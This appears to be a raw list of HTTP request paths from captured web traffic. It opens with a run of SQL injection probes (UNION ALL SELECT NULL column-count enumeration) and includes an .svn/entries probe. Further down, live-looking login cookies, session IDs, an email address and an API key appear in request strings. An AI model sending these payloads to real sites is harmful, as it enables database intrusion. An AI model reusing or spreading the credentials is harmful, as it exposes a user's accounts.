+/?rfrom=soso' UNION ALL SELECT NULL,NULL,NULL,NULL#
+/?rfrom=soso' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#
+/?rfrom=soso' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#
+/?rfrom=soso' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/?rfrom=soso' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/?rfrom=soso' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/?rfrom=soso' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/?rfrom=soso%' ORDER BY 1#
+/?rfrom=soso%' UNION ALL SELECT NULL#
+/?rfrom=soso%' UNION ALL SELECT NULL,NULL#
+/?rfrom=soso%' UNION ALL SELECT NULL,NULL,NULL#
+/?rfrom=soso%' UNION ALL SELECT NULL,NULL,NULL,NULL#
+/?rfrom=soso%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#
+/?rfrom=soso%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#
+/?rfrom=soso%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/?rfrom=soso%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/?rfrom=soso%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/?rfrom=soso%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/?rfrom=soso ORDER BY 1#
+/?rfrom=soso UNION ALL SELECT NULL#
+/?rfrom=soso UNION ALL SELECT NULL,NULL#
+/?rfrom=soso UNION ALL SELECT NULL,NULL,NULL#
+/?rfrom=soso UNION ALL SELECT NULL,NULL,NULL,NULL#
+/?rfrom=soso UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#
+/?rfrom=soso UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#
+/?rfrom=soso UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/?rfrom=soso UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/?rfrom=soso UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/?rfrom=soso UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/su?wd=deepin li&json=1&p=3&sid=7744_9008_1438_9182_7800_10194_10269_9475_10211_10120_10209_10016_10178_9498_10052_10218_10066_9770_10095_10007_10236_10256_9978_9024&req=2&bs=linux 设置静态ip&pbs=deepin&cb=jQuery110201803421920631081_1417221624129&_=1417221624163
+/favicon.ico
+/su?wd=deepin lin&json=1&p=3&sid=7744_9008_1438_9182_7800_10194_10269_9475_10211_10120_10209_10016_10178_9498_10052_10218_10066_9770_10095_10007_10236_10256_9978_9024&req=2&bs=linux 设置静态ip&pbs=deepin&cb=jQuery110201803421920631081_1417221624129&_=1417221624164
+/su?wd=deepin linu&json=1&p=3&sid=7744_9008_1438_9182_7800_10194_10269_9475_10211_10120_10209_10016_10178_9498_10052_10218_10066_9770_10095_10007_10236_10256_9978_9024&req=2&bs=linux 设置静态ip&pbs=deepin&cb=jQuery110201803421920631081_1417221624129&_=1417221624165
+/ProtectConfig.20141124.ini
+/it/u=3059557351,1912412045&fm=58
+/it/u=3971900000,3840384333&fm=96&s=A59214D376A0C15FC6A71C3803005048
+/cgi-bin/mail_list?sid=lpQyPHJkRu_WYUcT&folderid=3&page=0&topmails=0&loc=folderlist,,,3
+/it/u=2901046579,1185477288&fm=96
+/it/u=2507863794,1980770009&fm=96&s=BB5BA04CEFCB336C4A56048E0300E08A
+/su?wd=deepin linux&json=1&p=3&sid=7744_9008_1438_9182_7800_10194_10269_9475_10211_10120_10209_10016_10178_9498_10052_10218_10066_9770_10095_10007_10236_10256_9978_9024&req=2&bs=linux 设置静态ip&pbs=deepin linux&cb=jQuery110201803421920631081_1417221624129&_=1417221624166
+/2/remind/unread_count.json?uid=1992245353&unread_message=1&group_id=221102260100003958&source=140226478
+/link?url=QSRwk5J5U3EMyaJ9nHYxPJOQavqoCMCbddLORiCdYGk6VWR6sRuQOs843mcUgM-v
+/cgi-bin/.svn/entries
+/d/msdownload/update/software/defu/2014/11/am_delta_b86fdd4ab29ef30bbb2ef6f44580891396bc5eb0.exe
+/www/v2013/img/wljd-2.png
+/360ap/computerzsys_1.6.14.1022.cab
+/infoKey_2014112801.zip.enc?h=775587AA3AF0BE09C5BEF1458B4D73C9&v=7.4.0.4382&r=0000_sogou_pinyin_7_1_0_1719
+/su?wd=deepin linux &json=1&p=3&sid=7744_9008_1438_9182_7800_10194_10269_9475_10211_10120_10209_10016_10178_9498_10052_10218_10066_9770_10095_10007_10236_10256_9978_9024&req=2&bs=linux 设置静态ip&pbs=deepin linux&cb=jQuery110201803421920631081_1417221624129&_=1417221624167
+/it/u=681792939,266807419&fm=96&s=BC36C6156C26FF3E41B75DC90300E098
+/v2/ip_query.php?key=dc76799dd2e27326bbd0d1952307d129f7a217ae44ee84bdde24bc3e2f913df5&ip=10.12.15.17&output=json&timezone=false
+/
+/dict/smartinfo/up_smart_info.php?ver=20140910&h=775587AA3AF0BE09C5BEF1458B4D73C9&v=7.4.0.4382&r=0000_sogou_pinyin_7_1_0_1719
+/it/u=1381465365,2026766399&fm=96&s=BA5BA04C098B336E58CA008E030070CA
+/it/u=553043655,4179362239&fm=96&s=BA0FA844F7FF9E6D5AF6448E0300708B
+/it/u=777334363,789934401&fm=96&s=BB0FA04C574C016A1A223F9803008098
+/it/u=3220747772,2366438520&fm=96&s=EF990DC5FC74CA1F1589E1620300F053
+/it/u=3200535835,2403141027&fm=96
+/it/u=2255468888,1767216605&fm=58
+/it/u=902940176,2441474018&fm=96&s=BA4FA84CFD8BA76C1E56408E0300E0CA
+/su?wd=deepin linux s&json=1&p=3&sid=7744_9008_1438_9182_7800_10194_10269_9475_10211_10120_10209_10016_10178_9498_10052_10218_10066_9770_10095_10007_10236_10256_9978_9024&req=2&bs=linux 设置静态ip&pbs=deepin linux 2014&cb=jQuery110201803421920631081_1417221624129&_=1417221624168
+/hips/update/inst.htm?m=61667d819861387700b2c005543a1d51&v=1001020&s=30&r=0&d=10011
+/su?wd=deepin linux sh&json=1&p=3&sid=7744_9008_1438_9182_7800_10194_10269_9475_10211_10120_10209_10016_10178_9498_10052_10218_10066_9770_10095_10007_10236_10256_9978_9024&req=2&bs=linux 设置静态ip&pbs=deepin linux 2014&cb=jQuery110201803421920631081_1417221624129&_=1417221624169
+/poll?r=0.5491074624005705&u=295448167&s=7&k=_WlsoqRcZy6cEVR9&t=0&i=30&r=0.23786879749968648
+/Login/userpage
+/su?wd=deepin linux she&json=1&p=3&sid=7744_9008_1438_9182_7800_10194_10269_9475_10211_10120_10209_10016_10178_9498_10052_10218_10066_9770_10095_10007_10236_10256_9978_9024&req=2&bs=linux 设置静态ip&pbs=deepin linux 2014&cb=jQuery110201803421920631081_1417221624129&_=1417221624170
+/dict/upt_cell_dict6.5.php?id=|4|19441|15097|22408|270|15183|15201|15486|5|6|15182|15153&scdv=|1416912729|1374115642|1370515881|1364289186|1387263733|1263531777|1263529060|1377000056|1364289186|1311665836|1263529824|1291283272&h=775587AA3AF0BE09C5BEF1458B4D73C9&v=7.4.0.4382&r=0000_sogou_pinyin_7_1_0_1719&d=0&wizard=0&cs=1&patchup=1
+/dict/upt_push_dict.php?h=775587AA3AF0BE09C5BEF1458B4D73C9&v=7.4.0.4382&r=0000_sogou_pinyin_7_1_0_1719&cs=1
+/v2/ip_query.php?key=dc76799dd2e27326bbd0d1952307d129f7a217ae44ee84bdde24bc3e2f913df5&ip=10.12.15.17&output=json&timezone=false
+/pyup.gif?h=775587AA3AF0BE09C5BEF1458B4D73C9&v=7.4.0.4382&r=0000_sogou_pinyin_7_1_0_1719&UpScdbegin=1&s=1&queryscdmod=1&pushscd=1
+/su?wd=deepin linux shez&json=1&p=3&sid=7744_9008_1438_9182_7800_10194_10269_9475_10211_10120_10209_10016_10178_9498_10052_10218_10066_9770_10095_10007_10236_10256_9978_9024&req=2&bs=linux 设置静态ip&pbs=deepin linux 2014&cb=jQuery110201803421920631081_1417221624129&_=1417221624171
+/pyup.gif?h=775587AA3AF0BE09C5BEF1458B4D73C9&v=7.4.0.4382&r=0000_sogou_pinyin_7_1_0_1719&UpScdend=1&s=1&upmode=-1&pushscd=1
+/pyup.gif?h=775587AA3AF0BE09C5BEF1458B4D73C9&v=7.4.0.4382&r=0000_sogou_pinyin_7_1_0_1719&UpScdbegin=1&s=1&queryscdmod=1&pushscd=0
+/su?wd=deepin linux shezh&json=1&p=3&sid=7744_9008_1438_9182_7800_10194_10269_9475_10211_10120_10209_10016_10178_9498_10052_10218_10066_9770_10095_10007_10236_10256_9978_9024&req=2&bs=linux 设置静态ip&pbs=deepin linux 2014&cb=jQuery110201803421920631081_1417221624129&_=1417221624172
+/d/msdownload/update/software/defu/2014/11/am_delta_b86fdd4ab29ef30bbb2ef6f44580891396bc5eb0.exe
+/su?wd=deepin linux shezhi&json=1&p=3&sid=7744_9008_1438_9182_7800_10194_10269_9475_10211_10120_10209_10016_10178_9498_10052_10218_10066_9770_10095_10007_10236_10256_9978_9024&req=2&bs=linux 设置静态ip&pbs=deepin linux 2014&cb=jQuery110201803421920631081_1417221624129&_=1417221624173
+/QIpmsgUpdate/version_mac.xml
+/newpage/images/faxianbar.png
+/360ap/computerz_x64sys_1.6.14.1022.cab
+/su?wd=deepin linux 设置&json=1&p=3&sid=7744_9008_1438_9182_7800_10194_10269_9475_10211_10120_10209_10016_10178_9498_10052_10218_10066_9770_10095_10007_10236_10256_9978_9024&req=2&bs=linux 设置静态ip&pbs=deepin linux 2014&cb=jQuery110201803421920631081_1417221624129&_=1417221624174
+/patch_files_6.5/patch_1417006284_4.scel.gz?v=7.4.0.4382&h=775587AA3AF0BE09C5BEF1458B4D73C9
+/Login
+/MEkwR6ADAgEAMEAwPjA8MAkGBSsOAwIaBQAEFLG0OReQFreXeVAR8WC51KI82+3uBBQA+SrDQZG2ycK4PlXywJcRE6AHIAIDAjp2
+/patch_files_6.5/patch_1417088088_4.scel.gz?v=7.4.0.4382&h=775587AA3AF0BE09C5BEF1458B4D73C9
+/v2/ip_query.php?key=dc76799dd2e27326bbd0d1952307d129f7a217ae44ee84bdde24bc3e2f913df5&ip=10.12.15.17&output=json&timezone=false
+/pyup.gif?h=775587AA3AF0BE09C5BEF1458B4D73C9&v=7.4.0.4382&r=0000_sogou_pinyin_7_1_0_1719&UpScdend=1&s=1&id=4&upmode=1|&pushscd=0
+/Login/userpage
+/d/msdownload/update/software/defu/2014/11/am_delta_b86fdd4ab29ef30bbb2ef6f44580891396bc5eb0.exe
+/sdupexe_x64.cab
+/su?wd=deepin linux 设置j&json=1&p=3&sid=7744_9008_1438_9182_7800_10194_10269_9475_10211_10120_10209_10016_10178_9498_10052_10218_10066_9770_10095_10007_10236_10256_9978_9024&req=2&bs=linux 设置静态ip&pbs=deepin linux 2014&cb=jQuery110201803421920631081_1417221624129&_=1417221624175
+/crossdomain.html?t=20100205
+/su?wd=deepin linux 设置ji&json=1&p=3&sid=7744_9008_1438_9182_7800_10194_10269_9475_10211_10120_10209_10016_10178_9498_10052_10218_10066_9770_10095_10007_10236_10256_9978_9024&req=2&bs=linux 设置静态ip&pbs=deepin linux 2014&cb=jQuery110201803421920631081_1417221624129&_=1417221624176
+/service/newMessage/934176877@qq.com/1/0/0/0/0
+/360ap/360wifischooldll_a47d8017efc4cc72086bfb766ef60faa_1.0.0.1095.cab
+/360ap/360wifischooldll_a47d8017efc4cc72086bfb766ef60faa_1.0.0.1095.cab
+/360ap/360wifischooldll_a47d8017efc4cc72086bfb766ef60faa_1.0.0.1095.cab
+/cgi-bin/mail_list?sid=lpQyPHJkRu_WYUcT&folderid=6&folderkey=6&page=0&ver=181267.3&cachemod=maillist&cacheage=7200&r=
+/su?wd=deepin linux 设置jin&json=1&p=3&sid=7744_9008_1438_9182_7800_10194_10269_9475_10211_10120_10209_10016_10178_9498_10052_10218_10066_9770_10095_10007_10236_10256_9978_9024&req=2&bs=linux 设置静态ip&pbs=deepin linux 2014&cb=jQuery110201803421920631081_1417221624129&_=1417221624177
+/cgi-bin/getinvestigate?sid=lpQyPHJkRu_WYUcT
+/Login/self_information
+/服饰箱包/dp/B00NODWN8W/ref=pd_sim_sbs_sa_6?ie=UTF8&refRID=0KRK655F5SN7EZMR6T2T
+/su?wd=deepin linux 设置jint&json=1&p=3&sid=7744_9008_1438_9182_7800_10194_10269_9475_10211_10120_10209_10016_10178_9498_10052_10218_10066_9770_10095_10007_10236_10256_9978_9024&req=2&bs=linux 设置静态ip&pbs=deepin linux 2014&cb=jQuery110201803421920631081_1417221624129&_=1417221624178
+/cgi-bin/.svn/entries
+/static/css/index/userpage.css
+/static/js/jquery-1.10.1.min.js
+/static/image/logout_icon_2.png
+/newpage/r/j/m/m-3/em.js?v=1416303886227
+/ext/relatedItemsWidget.htm
+/photo/BF7Up4QQqM_T_fCixlHp5Q==/5772207347405742436.jpg
+/photo/KFjyejGRuq1PUyOdDNXCCQ==/5791066170845357749.jpg
+/photo/mlsXaZJ9L9cKUpbbmiy_Hw==/5791066170845357824.jpg
+/photo/Hk-H7jNDupSimMhIIsc-pg==/5791066170845357823.jpg
+/photo/ZUcHgAaMrT4d6Z2SqOvHKA==/5791066170845357826.jpg
+/photo/FtTtltwMyQYL2t65YDAM7g==/5772207347405742474.jpg
+/v2/ip_query.php?key=dc76799dd2e27326bbd0d1952307d129f7a217ae44ee84bdde24bc3e2f913df5&ip=10.12.15.17&output=json&timezone=false
+/photo/zdb_ucZ-wDgQk9FtcMX6Zw==/5791066170845357832.jpg
+/photo/VaUh4fXigKyBTENrI9FTkg==/5791066170845357836.jpg
+/photo/cG5moBla2XOHmMMlUiXXxA==/5791066170845357834.jpg
+/photo/5qxdT5UmagwunMRONjGVWg==/5791066170845357830.jpg
+/photo/MidHatnRVEO4MF19lBHtGg==/5791066170845357828.jpg
+/ext/related_items_v2?url=http://blog.163.com/slienceclown/blog/static/238737041201482223833689/&title=linux查找文件 - 懒喵的爪子的日志 - 网易博客&fromlocation=false&refer=http://slienceclown.blog.163.com/blogBackendManage.do?fromnewcenter&num=5&mode=3&pf=blog163&sitePrefix=http://blog.163.com/slienceclown/
+/su?wd=deepin linux 设置jin&json=1&p=3&sid=7744_9008_1438_9182_7800_10194_10269_9475_10211_10120_10209_10016_10178_9498_10052_10218_10066_9770_10095_10007_10236_10256_9978_9024&req=2&bs=linux 设置静态ip&pbs=deepin linux 2014&cb=jQuery110201803421920631081_1417221624129&_=1417221624179
+/images/G/01/AUIClients/NavAuiAssets-d9164f85dfdc275f8e2c9d13cfd25b577cb24c8c.min._V2_.css
+/images/G/01/AUIClients/AmazonUI-3036d00d6ff39fc8ad960847ba143f20533468be.cn.rendering_engine-not-trident.udp_amznjq_shim.weblab-AUI_CSS_REDUCTION_28708-T1.weblab-AUI_HIGH_CONTRAST_40800-T1.min._V2_.css
+/images/G/01/browser-scripts/cn-site-wide-css-beacon/site-wide-6800426958._V1_.css
+/images/G/01/AUIClients/SoftlinesDetailPageMetaAsset-f1bd11722d7e45d7ea9d2ff148e6cca2e5efe78f._V2_.css
+/d/msdownload/update/software/defu/2014/11/am_delta_b86fdd4ab29ef30bbb2ef6f44580891396bc5eb0.exe
+/mailEntry.do?blogad2=1&blog&v=7
+/ps_fp.htm?pid=ps&fp=3BD405A6244D04D1878B7B8AD3DE32F7&im=0&wf=1&br=2&qid=a2f02b8800068a63&bi=F5B42E62CCA313E12B218A22042B376D:FG=1
+/download/14705/
+/su?wd=deepin linux 设置jing&json=1&p=3&sid=7744_9008_1438_9182_7800_10194_10269_9475_10211_10120_10209_10016_10178_9498_10052_10218_10066_9770_10095_10007_10236_10256_9978_9024&req=2&bs=linux 设置静态ip&pbs=deepin linux 2014&cb=jQuery110201803421920631081_1417221624129&_=1417221624180
+/images/G/28/gno/images/orangeBlue/navPackedSprites-CN-14._V149627272_.png
+/images/G/01/AUIClients/NavAuiAssets-99b759846c7edb458a862850eb3967e065e55f1b.min._V2_.js
+/images/G/28/x-locale/common/transparent-pixel._V386947693_.gif
+/images/G/28/gno/sprites/global-sprite-v1._V339353346_.png
+/images/G/01/browser-scripts/aplusDPCSS/aplusDPCSS-3119763851._V1_.css
+/images/I/51vKAwv+JoL._SX342_.jpg
+/images/G/01/browser-scripts/dpMergedOverallCSS/dpMergedOverallCSS-13201183111._V1_.css
+/images/G/01/browser-scripts/site-wide-js-1.6.4-beacon/site-wide-9181374584._V1_.js
+/images/I/51vKAwv+JoL._SR38,50_.jpg
+/images/G/28/x-locale/common/one-pixel._V157485584_.gif?id=7221863
+/images/G/28/app-yy/2014/yaoyao/1_2014._V349274520_.png
+/images/I/51h29gTotLL._SR38,50_.jpg
+/images/I/51b2BdvJKCL._SR38,50_.jpg
+/images/G/28/app-yd/down-coat-HQP-75x75._SS75_V320635100_.jpg
+/images/G/01/amazonui/sprites/aui_sprite_0034-2x-hc._V1_.png
+/images/I/51tuHeQbQ6L._SL500_SS100_.jpg
+/images/G/28/hehehe/2014/bfgateway/bw_20141127_37050_blackfriday._V319120772_.jpg
+/images/G/28/gno/images/general/navAmazonLogoFooter._V169459411_.gif
+/images/I/51MuDRXIkqL._SL500_SS100_.jpg
+/images/I/415Fzu+htAL._SL500_SS100_.jpg
+/images/I/41DzSS+Nv4L._SL500_SS100_.jpg
+/images/I/41F2SzQ+xvL._SL500_SS100_.jpg
+/su?wd=deepin linux 设置jingt&json=1&p=3&sid=7744_9008_1438_9182_7800_10194_10269_9475_10211_10120_10209_10016_10178_9498_10052_10218_10066_9770_10095_10007_10236_10256_9978_9024&req=2&bs=linux 设置静态ip&pbs=deepin linux 2014&cb=jQuery110201803421920631081_1417221624129&_=1417221624181
+/images/I/41IAUuAvOnL._SL500_SS100_.jpg
+/images/I/51vKAwv+JoL._SL500_SS45_.jpg
+/images/G/01/browser-scripts/pageRefreshJSMerged/pageRefreshJSMerged-24779._V1_.js
+/images/G/28/common/sprites/sprite-site-wide._V375570960_.png
+/images/G/01/amazonui/sprites/aui_sprite_0034-1x-hc._V1_.png
+/images/G/01/browser-scripts/amazonShoveler/amazonShoveler-1668981302._V1_.js
+/newpage/images/lnkbg.png?t=20100629
+/KsafeSpeedTest/ksafe/queryip.d?ip=74.125.31.93
+/KsafeSpeedTest/ksafe/queryip.d?ip=122.193.207.31
+/KsafeSpeedTest/ksafe/queryip.d?ip=123.129.208.84
+/KsafeSpeedTest/ksafe/queryip.d?ip=173.194.33.102
+/?enlarge=true&imgurl=http://img2.cache.netease.com/cnews/2014/11/29/2014112905215542f98.jpg_240x150x1.jpg
+/?imgurl=http://imglf0.ph.126.net/nf56_-cN2kcFHKmBelYG9g==/2764084271316123063.jpg_115x115x1.jpg
+/1/batch/1/OP/AAHKV2X7AFYLW:477-0937561-4232724:1R0CT3187PWBJFYG2R0D$uedata=s:/gp/product/B00NODWN8W/uedata/unsticky/477-0937561-4232724/Detail/ntpoffrw?staticb&id=1R0CT3187PWBJFYG2R0D&pty=Gateway&spty=gateway-three-column&pti=899254051:1000
+/?imgurl=http://imglf2.ph.126.net/YLf-6_KovVm7maX98mieqg==/6619505301421316468.jpg_115x115x1.jpg
+/?imgurl=http://imglf0.ph.126.net/HBFFncTdv_ulVNfFnzZ0Ow==/1054968212728493052.jpg_240x150x1.jpg
+/xn7OupmptuppArTkNpkgaA==/2402670401219882967.jpg
+/?imgurl=http://imglf0.ph.126.net/HBFFncTdv_ulVNfFnzZ0Ow==/1054968212728493052.jpg_115x115x1.jpg
+/?imgurl=http://imglf2.ph.126.net/MY2J_DccvVls9dAtDJhUvg==/6619114974793443200.jpg_115x115x1.jpg
+/?imgurl=http://imglf0.ph.126.net/nf56_-cN2kcFHKmBelYG9g==/2764084271316123063.jpg_240x150x1.jpg
+/su?wd=deepin linux 设置静态&json=1&p=3&sid=7744_9008_1438_9182_7800_10194_10269_9475_10211_10120_10209_10016_10178_9498_10052_10218_10066_9770_10095_10007_10236_10256_9978_9024&req=2&bs=linux 设置静态ip&pbs=deepin linux 2014&cb=jQuery110201803421920631081_1417221624129&_=1417221624182
+/gp/product/B00NODWN8W/uedata/unsticky/477-0937561-4232724/Detail/ntpoffrw?ld&v=0.64.0&id=1R0CT3187PWBJFYG2R0D&m=1&sc=1R0CT3187PWBJFYG2R0D&ue=18&bb=491&ns=496&ne=662&cf=688&be=706&pc=1020&tc=-144&na_=-144&fe_=-144&lk_=-144&_lk=-144&co_=-144&_co=-114&rq_=-114&rs_=-5&_rs=634&dl_=-1&di_=706&de_=706&_de=707&_dc=1019&ld_=1020&ntd=0&ty=0&rc=0&hob=17&hoe=19&ld=1020&t=1417221864292&ctb=1&ec=3&ecf=3&csmtags=aui|aui:aui_build_date:3.14.7.2-2014-11-23|fls-cn&viz=visible:18&pty=Detail&spty=Glance&pti=B00NODWN8W&aftb=1
+/1/batch/1/OP/AAHKV2X7AFYLW:477-0937561-4232724:1R0CT3187PWBJFYG2R0D$uedata=s:/gp/product/B00NODWN8W/uedata/unsticky/477-0937561-4232724/Detail/ntpoffrw?ld&v=0.64.0&id=1R0CT3187PWBJFYG2R0D&m=1&sc=1R0CT3187PWBJFYG2R0D&ue=18&bb=491&ns=496&ne=662&cf=688&be=706&pc=1020&tc=-144&na_=-144&fe_=-144&lk_=-144&_lk=-144&co_=-144&_co=-114&rq_=-114&rs_=-5&_rs=634&dl_=-1&di_=706&de_=706&_de=707&_dc=1019&ld_=1020&ntd=0&ty=0&rc=0&hob=17&hoe=19&ld=1020&t=1417221864292&ctb=1&ec=3&ecf=3&csmtags=aui|aui:aui_build_date:3.14.7.2-2014-11-23|fls-cn&viz=visible:18&pty=Detail&spty=Glance&pti=B00NODWN8W&aftb=1:1021
+/images/G/01/browser-scripts/DA-cn/DA-cn-614005562._CB320340845_.js
+/setcookie.jsp?loginCookie=cqHQUQSg13eA6CmgkiSTgE4rw0ARyZ_K9JJ3.rrtEw.QhhzS8RdvBw4.whHJbaa_4.STbZj0W3zgJpzMaTObJK8.j45jbF5Ihup8ORBRtW4myWD5bR7cAtDuVefo6ynysJVj_1y0FoZzxL1YQcNm3.SUv&sInfoCookie=1417221854|0|##|934176877@qq.com&pInfoCookie=934176877@qq.com|1417221854|0|163|00&99|shd&1416499051&163#zhj&330100#10#0#0|&0||934176877@qq.com&domain=126.am
+/setcookie.jsp?loginCookie=cqHQUQSg13eA6CmgkiSTgE4rw0ARyZ_K9JJ3.rrtEw.QhhzS8RdvBw4.whHJbaa_4.STbZj0W3zgJpzMaTObJK8.j45jbF5Ihup8ORBRtW4myWD5bR7cAtDuVefo6ynysJVj_1y0FoZzxL1YQcNm3.SUv&sInfoCookie=1417221854|0|##|934176877@qq.com&pInfoCookie=934176877@qq.com|1417221854|0|163|00&99|shd&1416499051&163#zhj&330100#10#0#0|&0||934176877@qq.com&domain=www.lofter.com
+/setcookie.jsp?loginCookie=cqHQUQSg13eA6CmgkiSTgE4rw0ARyZ_K9JJ3.rrtEw.QhhzS8RdvBw4.whHJbaa_4.STbZj0W3zgJpzMaTObJK8.j45jbF5Ihup8ORBRtW4myWD5bR7cAtDuVefo6ynysJVj_1y0FoZzxL1YQcNm3.SUv&sInfoCookie=1417221854|0|##|934176877@qq.com&pInfoCookie=934176877@qq.com|1417221854|0|163|00&99|shd&1416499051&163#zhj&330100#10#0#0|&0||934176877@qq.com&domain=huihui.cn
+/1/batch/1/OP/AAHKV2X7AFYLW:477-0937561-4232724:1R0CT3187PWBJFYG2R0D$uedata=s:/gp/product/B00NODWN8W/uedata/unsticky/477-0937561-4232724/Detail/ntpoffrw?ld&v=0.64.0&id=1R0CT3187PWBJFYG2R0D&sc0=jQueryActive&pc0=790&ld0=790&t0=1417221864062&ctb=1:1022
+/newpage/images/lofterad/close2.png
+/setcookie.jsp?loginCookie=cqHQUQSg13eA6CmgkiSTgE4rw0ARyZ_K9JJ3.rrtEw.QhhzS8RdvBw4.whHJbaa_4.STbZj0W3zgJpzMaTObJK8.j45jbF5Ihup8ORBRtW4myWD5bR7cAtDuVefo6ynysJVj_1y0FoZzxL1YQcNm3.SUv&sInfoCookie=1417221854|0|##|934176877@qq.com&pInfoCookie=934176877@qq.com|1417221854|0|163|00&99|shd&1416499051&163#zhj&330100#10#0#0|&0||934176877@qq.com&domain=126.am
+/setcookie.jsp?loginCookie=cqHQUQSg13eA6CmgkiSTgE4rw0ARyZ_K9JJ3.rrtEw.QhhzS8RdvBw4.whHJbaa_4.STbZj0W3zgJpzMaTObJK8.j45jbF5Ihup8ORBRtW4myWD5bR7cAtDuVefo6ynysJVj_1y0FoZzxL1YQcNm3.SUv&sInfoCookie=1417221854|0|##|934176877@qq.com&pInfoCookie=934176877@qq.com|1417221854|0|163|00&99|shd&1416499051&163#zhj&330100#10#0#0|&0||934176877@qq.com&domain=www.lofter.com
+/setcookie.jsp?loginCookie=cqHQUQSg13eA6CmgkiSTgE4rw0ARyZ_K9JJ3.rrtEw.QhhzS8RdvBw4.whHJbaa_4.STbZj0W3zgJpzMaTObJK8.j45jbF5Ihup8ORBRtW4myWD5bR7cAtDuVefo6ynysJVj_1y0FoZzxL1YQcNm3.SUv&sInfoCookie=1417221854|0|##|934176877@qq.com&pInfoCookie=934176877@qq.com|1417221854|0|163|00&99|shd&1416499051&163#zhj&330100#10#0#0|&0||934176877@qq.com&domain=huihui.cn
+/seupdater.gif?h=775587AA3AF0BE09C5BEF1458B4D73C9&elapse=1318239&res=0
+/su?wd=deepin linux 设置静态i&json=1&p=3&sid=7744_9008_1438_9182_7800_10194_10269_9475_10211_10120_10209_10016_10178_9498_10052_10218_10066_9770_10095_10007_10236_10256_9978_9024&req=2&bs=linux 设置静态ip&pbs=deepin linux 2014&cb=jQuery110201803421920631081_1417221624129&_=1417221624183
+/su?wd=deepin linux 设置静态ip&json=1&p=3&sid=7744_9008_1438_9182_7800_10194_10269_9475_10211_10120_10209_10016_10178_9498_10052_10218_10066_9770_10095_10007_10236_10256_9978_9024&req=2&bs=linux 设置静态ip&pbs=deepin linux 2014&cb=jQuery110201803421920631081_1417221624129&_=1417221624184
+/d/msdownload/update/software/defu/2014/11/am_delta_b86fdd4ab29ef30bbb2ef6f44580891396bc5eb0.exe
+/link?url=ldbjGRboDylBtga3_KZtvc8Mnpyjj9Yrb6ssFnxnnn9zp5fs0G-Kzz5t7gj6bkAeqLjaQ5NkC7oTr-39RlQ_tK
+/shuma/28/126028.html
+/advertisement/scripts/42/277.js
+/images/G/01/nav2/gamma/lazyLoadLib/lazyLoadLib-lazyLoadLib-62327._V1_.js
+/advertisement/scripts/102/277.js
+/advertisement/scripts/97/277.js
+/advertisement/scripts/81/277.js
+/advertisement/scripts/87/277.js
+/advertisement/scripts/89/277.js
+/advertisement/scripts/96/277.js
+/advertisement/scripts/40/277.js
+/advertisement/sp/js/hot_zhuanti_0.js?v=1.123
+/Login/inner_announce
+/advertisement/scripts/100/277.js
+/js/list_pic.js
+/advertisement/scripts/152/277.js
+/advertisement/scripts/154/277.js
+/advertisement/scripts/155/277.js
+/statics/js/limengjun/2014/11/tongji.js
+/statics/js/tongji.js
+/gg/pub.js
+/c.gif?t=0&q=deepin+linux+���þ�̬ip&p=0&pn=1
+/qqpy.php?v=1.2.1264.400&h=3d19f69e58ce2b2a19025bc3853b43ef
+/d/msdownload/update/software/defu/2014/11/am_delta_b86fdd4ab29ef30bbb2ef6f44580891396bc5eb0.exe
+/code/jia.js
+/dict/update/upt_website.php?md5=27EF083D5F7AC1168F36B85C2ABE6267&h=775587AA3AF0BE09C5BEF1458B4D73C9&v=7.4.0.4382&r=0000_sogou_pinyin_7_1_0_1719
+/big5stat.gif?&big5shortcut=0&swtichtoBig5=0&h=775587AA3AF0BE09C5BEF1458B4D73C9&v=7.4.0.4382&r=0000_sogou_pinyin_7_1_0_1719
+/v2/ip_query.php?key=dc76799dd2e27326bbd0d1952307d129f7a217ae44ee84bdde24bc3e2f913df5&ip=10.12.15.17&output=json&timezone=false
+/360ap/360wifischool64dll_c8bba8e3f5f563f2d6481f23801cb839_1.0.0.1095.cab
+/360ap/360wifischool64dll_c8bba8e3f5f563f2d6481f23801cb839_1.0.0.1095.cab
+/360ap/360wifischool64dll_c8bba8e3f5f563f2d6481f23801cb839_1.0.0.1095.cab
+/d/msdownload/update/software/defu/2014/11/am_delta_b86fdd4ab29ef30bbb2ef6f44580891396bc5eb0.exe
+/download/14705/
+/v2/ip_query.php?key=dc76799dd2e27326bbd0d1952307d129f7a217ae44ee84bdde24bc3e2f913df5&ip=10.12.15.17&output=json&timezone=false
+/css/sub/sub_inc.css
+/css/main2014.css?v=1.07
+/js/pinglun.js
+/js/common.js
+/js/talk.js
+/js/jquery-1.4.4.min.js
+/js/auto_run.js?v=1
+/js/article.js?v=1.2.1
+/js/7y7.key.js
+/js/share.js
+/js/share1.js
+/link?url=ngEDW8fVjB_VcpzFr_uve3CmCfwmQsLp0JvDIRzBHeLnq7TgW_0MfUxb1Smht9ACHt3s7lKrm7uLe6vSm_sIiq
+/js/7y7.ad.dl.js
+/images/icon1.jpg
+/images/7y7-logo.gif
+/images/201409/homes-icon.gif
+/images/201409/74x74.jpg
+/images/201409/dh-icon.jpg
+/images/saomiao_pic1.jpg
+/images/wangjing/anwang.gif
+/images/wangjing/wangjing.gif
+/images/rss_pic1.jpg
